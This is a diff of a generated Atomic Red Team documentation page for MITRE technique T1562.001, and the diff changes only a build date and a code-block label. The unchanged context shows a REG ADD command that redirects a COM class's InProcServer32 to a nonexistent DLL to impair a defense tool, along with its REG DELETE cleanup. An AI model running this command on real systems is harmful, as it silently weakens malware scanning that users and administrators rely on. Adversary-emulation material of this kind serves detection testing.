@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1562.001"
 attack_technique_name: "Impair Defenses: Disable or Modify Tools"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "17538258-5699-4ff1-92d1-5ac9b0dc21f5"
@@ -47,13 +47,13 @@ https://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptosteal
 
 ### Command
 
-```commandprompt
+```cmd
 REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 REG DELETE HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /f
 ```
 
